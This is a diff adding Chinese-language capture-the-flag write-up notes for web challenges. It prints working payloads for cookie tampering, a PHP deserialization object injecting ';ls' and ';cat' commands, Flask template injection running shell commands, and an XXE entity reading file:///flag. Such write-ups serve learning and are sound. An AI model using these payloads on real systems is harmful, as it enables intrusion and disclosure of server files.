@@ -22,8 +22,6 @@
 
 pdf裡面藏白色文字 全選起來用editor解答
 
-## Misc
-
 ## Pwn
 
 ### 0x01 (BOF)
@@ -94,3 +92,123 @@ print(r.recvline())
 ```
 
 ## Web
+
+### 0x01 (session)
+
+用brup抓包
+
+觀察提示的使用者 clara 的封包
+
+=PZge c JryZ l TvNv a Fbgs r eBYt a
+
+只是使用者名稱混雜一些字元
+
+於是把clara的部分admin即可
+
+改完後 `=PZgeaJryZdTvNvmFbgsieBYtn`
+
+requestt出去就拿到flag了
+
+### 0x02 (serialize)
+
+將`__wakeup`中的this改成想要執行的指令(wakup函式在反序列化時一定會執行)
+
+```php
+<?php
+
+class MyFirstCTF {
+    protected $test = "CTF";
+    function __wakeup()
+    {
+        // print "Wake up yo!<br>";
+        // system("echo ".$this->test);
+    }
+}
+$obj = new MyFirstCTF();
+$obj->test=";ls";
+$ser = serialize($obj);
+
+printf($ser);
+
+
+// $input = $_GET['str'];
+// $kb = unserialize($input);
+?>
+```
+print出來的字串是`O:10:"MyFirstCTF":1:{s:4:"test";s:3:";ls";}`
+
+但是丟出去之後沒反應
+
+猜測應該是protected的關係
+
+[參考這篇文章](https://www.cnblogs.com/Mrsm1th/p/6835592.html)
+
+所以要加 `\00*\00` 並且加上3(長度) 變成 `O:10:"MyFirstCTF":1:{s:7:"%00*%00test";s:3:";ls";}`
+
+噴出 `Th1s_1S_f1ag__________________y0 index.html index.php`
+
+再丟一波 `O:10:"MyFirstCTF":1:{s:7:"%00*%00test";s:37:";cat Th1s_1S_f1ag__________________y0";}`
+
+解答
+
+文章重點
+
+不同類型變數序列化的值不一樣 但是看起來沒差 以protected 因為是null byte 所以要自己加 '\00*\00' 長度多3
+```
+private的参数被反序列化后变成 \00test\00test1 
+public的参数变成 test2   p
+rotected的参数变成 \00*\00test3 
+```
+
+### 0x03 (SSTI)
+
+從網頁完全看不出是GET哪個變數
+
+看了幾篇教學是用name當範例
+
+於是
+
+140.110.112.29:1008?name=123
+
+結果有反應(通靈ㄏㄏ)
+
+先確定是用{{}}來印出變數 (每一種模板不同)
+
+140.110.112.29:1008/?name={{7*7}}
+
+140.110.112.29:1008?name={{request.environ}}
+
+發現是flask
+
+於是
+
+`http://140.110.112.29:1008/?name={{ config['RUNCMD']('ls -alh',shell=True) }}`
+
+`http://140.110.112.29:1008/?name={{ config['RUNCMD']('cat flag',shell=True) }}`
+
+[參考文章](https://hellohxk.com/blog/ssti/)
+
+### 0x04 (XXE)
+
+GET用240610708來繞過
+
+丟以下data進post內容
+```
+<abcdef>
+ <MyFirstCTF>Hello</MyFirstCTF>
+</abcdef>
+```
+XML解析有回應
+
+```
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE yiyu [ <!ELEMENT methodname ANY > 
+<!ENTITY xxe SYSTEM "file:///flag" >]> 
+<methodcall> 
+<MyFirstCTF>&xxe;</MyFirstCTF> 
+</methodcall>
+```
+flag的實際路徑亂猜的 結果就中了ㄏㄏ
+
+[參考文章](http://www.freebuf.com/column/156863.html
+)
